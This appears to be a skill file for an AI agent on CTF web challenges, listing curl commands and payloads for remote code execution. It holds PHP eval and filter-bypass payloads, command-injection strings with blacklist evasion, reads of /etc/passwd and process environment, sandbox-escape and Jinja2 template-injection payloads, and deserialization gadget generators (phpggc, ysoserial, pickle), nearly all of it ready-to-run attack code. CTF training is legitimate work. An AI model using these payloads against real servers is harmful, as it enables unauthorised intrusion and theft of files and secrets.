---
name: web-server-exec
description: "CTF web server code execution challenges: PHP webshell, eval bypass, command injection CTF, RCE via deserialization, sandbox escape. Triggers: 'ctf web exec', 'ctf rce', 'ctf command injection', 'ctf php exec', 'ctf sandbox escape', 'ctf code execution'."
---

# CTF Web Server Code Execution

Common CTF patterns for achieving code/command execution on web servers.

## Phase 1: PHP Eval and Code Execution Bypass

```bash
TARGET="https://CTF_TARGET"

# Direct code execution parameters
curl "$TARGET/?code=system('id');"
curl "$TARGET/?eval=phpinfo();"
curl "$TARGET/?exec=ls"

# Blocked function bypass
# If system() blocked, try:
curl "$TARGET/?code=passthru('id');"
curl "$TARGET/?code=shell_exec('id');"
curl "$TARGET/?code=popen('id','r');"
curl "$TARGET/?code=proc_open('id',[],'');"
curl "$TARGET/?code=\`id\`;"
curl "$TARGET/?code=assert('system(\"id\")');"

# Eval with variable functions
curl "$TARGET/?code=\$f='system';\$f('id');"

# String concat bypass (if 'system' is filtered as literal)
curl "$TARGET/?code=\$a='sys'.'tem';\$a('id');"

# Hex/octal encoding
curl "$TARGET/?code=\$a=hex2bin('73797374656d');\$a('id');"  # 'system' in hex
```

## Phase 2: Command Injection CTF Patterns

```bash
# Parameter injection
curl "$TARGET/ping?host=127.0.0.1;id"
curl "$TARGET/ping?host=127.0.0.1|id"
curl "$TARGET/ping?host=127.0.0.1%0aid"
curl "$TARGET/ping?host=127.0.0.1\`id\`"
curl "$TARGET/ping?host=\$(id)"

# Blacklist bypass
# Space bypass
curl "$TARGET/exec?cmd=cat${IFS}/etc/passwd"
curl "$TARGET/exec?cmd=cat</etc/passwd"
curl "$TARGET/exec?cmd={cat,/etc/passwd}"

# Slash bypass
curl "$TARGET/exec?cmd=cat${HOME:0:1}etc${HOME:0:1}passwd"

# Read files without cat
curl "$TARGET/exec?cmd=less+/etc/passwd"
curl "$TARGET/exec?cmd=head+-1+/etc/passwd"
curl "$TARGET/exec?cmd=tac+/etc/passwd"
curl "$TARGET/exec?cmd=od+-A+x+-t+x1z+/etc/passwd"

# Common CTF flag locations
for path in /flag /flag.txt /root/flag /root/flag.txt /home/ctf/flag /tmp/flag; do
  curl -s "$TARGET/exec?cmd=cat+$path" | grep -E "HTB|CTF|FLAG|flag\{" && echo "FOUND at $path"
done
```

## Phase 3: Python/Ruby/Node Sandbox Escape

```bash
# Python sandbox escape
# If eval/exec allowed in Python sandbox:
python3 -c "print(__import__('subprocess').check_output('id',shell=True).decode())"

# Python jail common bypasses
# Via builtins
"__import__('os').system('id')"
"().__class__.__base__.__subclasses__()[X].__init__.__globals__['os'].system('id')"

# Ruby eval
"require 'open3'; Open3.capture2('id')"
"`id`"

# Node.js
"require('child_process').execSync('id').toString()"
"process.mainModule.require('child_process').execSync('id').toString()"

# Jinja2 SSTI to RCE (CTF common)
"{{''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['__builtins__']['__import__']('os').system('id')}}"
# Find subprocess.Popen class index:
# {{''.__class__.__mro__[1].__subclasses__() | list}}
```

## Phase 4: Deserialization RCE

```bash
# PHP unserialize (if user input deserialized)
# Generate payload with phpggc
phpggc -l  # list available chains
phpggc Laravel/RCE1 system id | base64
phpggc Monolog/RCE1 system id
phpggc Symfony/RCE4 system id

# Java deserialization
# Generate with ysoserial
java -jar ysoserial.jar CommonsCollections1 'id' | base64
java -jar ysoserial.jar Spring1 'id' | base64

# Python pickle
python3 -c "
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"
```

## Phase 5: File Read for Flag

```bash
# When direct RCE achieved, find the flag
find / -name "flag*" -o -name "*.txt" 2>/dev/null | grep -v proc | head -20
find / -maxdepth 5 -name "flag" 2>/dev/null
cat /flag /flag.txt /root/flag.txt /home/*/flag* 2>/dev/null

# Environment variables (sometimes flag is in env)
curl "$TARGET/exec?cmd=printenv"
curl "$TARGET/exec?cmd=cat+/proc/1/environ"

# Common CTF flag format grep
curl "$TARGET/exec?cmd=grep+-r+'flag{'+/" 2>/dev/null
```

## Output

Save to `/workspace/output/`:
- `ctf-rce.txt`: RCE method and proof
- `ctf-flag.txt`: flag value

## Next Phase

→ `vuln-ssti` for template injection RCE
→ `vuln-deserialization` for serialization gadget chains
